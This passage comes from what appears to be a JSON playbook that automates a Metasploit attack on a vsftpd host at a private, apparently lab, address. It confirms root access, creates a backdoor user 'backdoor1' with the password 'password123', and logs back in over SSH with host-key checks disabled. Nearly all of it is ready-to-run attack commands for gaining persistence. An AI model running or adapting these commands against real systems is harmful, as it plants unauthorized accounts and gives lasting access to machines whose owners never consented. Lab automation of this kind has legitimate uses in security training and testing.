                    "stage": "privilege_escalation",
                    "description": "Verify root privileges",
                    "commands": [
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "sessions -i 1 -c 'id'",
                            "wait": 3
                        }
                    ],
                    "verification": "Check for uid=0(root)"
                },
                {
                    "stage": "persistence",
                    "description": "Create backdoor user for SSH access",
                    "commands": [
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "sessions -i 1 -c 'useradd -m -s /bin/bash backdoor1'",
                            "wait": 3
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "sessions -i 1 -c \"echo 'backdoor1:password123' | chpasswd\"",
                            "wait": 2
                        },
                        {
                            "type": "close_session",
                            "session_name": "vsftpd_session"
                        },
                        {
                            "type": "regular",
                            "command": "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa backdoor1@192.168.56.5 'whoami'"
